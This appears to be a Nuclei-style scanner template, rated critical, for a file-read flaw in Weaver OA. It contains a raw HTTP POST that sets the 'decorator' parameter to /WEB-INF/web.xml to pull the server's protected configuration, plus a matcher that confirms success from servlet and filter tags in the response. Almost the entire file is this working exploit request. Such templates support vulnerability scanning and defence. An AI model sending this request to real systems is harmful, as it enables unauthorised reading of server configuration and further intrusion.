id: weaver-oa-decorator-read

info:
  name: weaver-oa-decorator-read
  author: weaver-oa-decorator-read
  severity: critical

http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
        
        decorator=%2FWEB-INF%2Fweb.xml&confirm=true


    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains_all(body,"servlet-name","servlet-class","filter-name")'
